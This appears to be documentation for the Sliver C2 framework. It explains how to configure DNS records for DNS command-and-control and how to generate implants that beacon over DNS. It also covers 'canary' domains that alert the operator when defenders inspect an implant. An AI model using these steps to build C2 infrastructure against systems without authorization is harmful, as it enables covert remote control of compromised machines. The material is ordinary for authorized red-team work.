# Setup

Use the following steps to configure a domain for DNS C2 (and DNS Canaries), you can use any DNS provider you wish as long as you setup the records correctly. I recommend setting a TTL of ~5 minutes for each record.

1. Create an `A` record for your `example.com` pointing at your Sliver server (or redirector) IP address.
2. Create an `A` record for an `ns1` subdomain (i.e. `ns1.example.com`) that points to your Sliver server (or redirector) IP address.
3. Create an NS record with an arbitrary subdomain, for example `1` (i.e. `1.example.com`) which is managed by `ns1.example.com`.
4. You can now use `1.example.com` as your DNS C2 domain e.g. `generate --dns 1.example.com.` (always use the FQDN when issuing DNS commands).

The final configuration should look like for the domain `lil-peep.rip`:
![DNS Configuration](https://i.imgur.com/hpOnGJp.png)


__IMPORTANT:__ Remember to disable Cloudflare's "cloud" when configuring these records, and to adjust the TTLs.


### DNS Canaries

DNS Canaries are unique per-binary domains that are optionally inserted during the string obfuscation process. These domains are not actually used by the implant code and are deliberately _not obfuscated_ so that they show up if someone runs `strings` on the implant. If these domains are ever resolved (and you have a `dns` listener running) you'll get an alert telling which specific file was discovered by the blue team.

Example `generate` command with canaries, make sure to use the FQDN:

```
sliver > generate --http foobar.com --canary 1.example.com.
```

Make sure you have a DNS listener running, and to use the FQDN:

```
sliver > dns --domains 1.example.com.

[*] Starting DNS listener with parent domain(s) [1.example.com.] ...
[*] Successfully started job #1
```

You can view previously generated canaries with the `canaries` command.

### Ubuntu

__NOTE:__ On recent versions of Ubuntu, you may need to disable `systemd-resolved` as this binds to your local UDP:53 and fucks up everything about how DNS is supposed to work. To use a sane DNS configuration run the following commands as root because `resolved` probably broke `sudo` too:

```bash
systemctl disable systemd-resolved.service
systemctl stop systemd-resolved
rm -f /etc/resolv.conf
vim /etc/resolv.conf
```

Add a normal `resolv.conf`:

```
nameserver 1.1.1.1
nameserver 8.8.8.8
```

# Under the Hood

TODO :)